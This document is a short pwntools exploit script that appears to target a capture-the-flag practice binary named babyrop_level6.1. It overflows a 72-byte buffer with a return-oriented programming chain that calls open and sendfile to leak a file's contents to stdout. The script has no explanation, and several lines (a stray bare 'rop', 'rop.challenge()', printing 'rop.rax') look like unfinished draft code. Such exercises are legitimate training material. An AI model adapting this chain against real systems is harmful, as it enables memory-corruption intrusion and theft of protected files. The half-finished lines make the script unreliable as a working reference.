from pwn import *

context.arch = "amd64"

elf = ELF("/challenge/babyrop_level6.1")
#strace < test.bin
io = elf.process()

buffer_len = 72
rop = ROP(elf)
rop.rsi = p64(0)
rop.rdi = p64(0x4020a1)
rop.open()
rop.rdi = 1
rop.rsi = 3
rop.rcx = 255
rop.rdx = 0
rop.sendfile()
print(rop.rax)
rop.challenge()
rop
PAYLOAD = b'A'*(buffer_len) + rop.chain()

io.send(PAYLOAD)
with open("test.bin", "wb") as f:
    f.write(PAYLOAD)
io.interactive()
